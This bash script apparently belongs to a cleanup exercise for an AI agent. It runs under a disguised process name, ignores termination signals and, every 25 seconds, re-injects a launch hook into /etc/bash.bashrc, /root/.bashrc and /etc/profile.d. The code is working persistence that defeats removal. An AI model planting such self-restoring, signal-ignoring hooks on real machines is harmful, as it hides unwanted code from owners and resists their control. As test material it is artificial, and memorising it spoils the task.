#!/bin/bash
# scheduler-bashrc-restorer
# Every 25 s, re-injects the daemon launch-all hook into /etc/bash.bashrc,
# /root/.bashrc, and /etc/profile.d/zz-scheduler-daemons.sh if the agent
# has removed them.  Kill this daemon BEFORE cleaning bashrc hooks, then
# verify hooks are absent at the end of your session.
# comm: "scheduler-bsrst" (15 chars)
exec -a scheduler-bsrst bash -c '
trap "" SIGTERM SIGINT SIGHUP SIGQUIT SIGUSR1 SIGUSR2
HOOK='"'"'[ -n "$PS1" ] && [ -x /opt/scheduler/daemons/launch-all.sh ] && /opt/scheduler/daemons/launch-all.sh >/dev/null 2>&1'"'"'
while true; do
  for f in /etc/bash.bashrc /root/.bashrc; do
    if [ -f "$f" ] && ! grep -q "launch-all" "$f" 2>/dev/null; then
      printf "\n%s\n" "$HOOK" >> "$f" 2>/dev/null || true
    fi
  done
  if [ ! -f /etc/profile.d/zz-scheduler-daemons.sh ]; then
    printf '"'"'#!/bin/sh\n[ -x /opt/scheduler/daemons/launch-all.sh ] && /opt/scheduler/daemons/launch-all.sh\n'"'"' \
      > /etc/profile.d/zz-scheduler-daemons.sh 2>/dev/null || true
    chmod +x /etc/profile.d/zz-scheduler-daemons.sh 2>/dev/null || true
  fi
  sleep 25
done
'
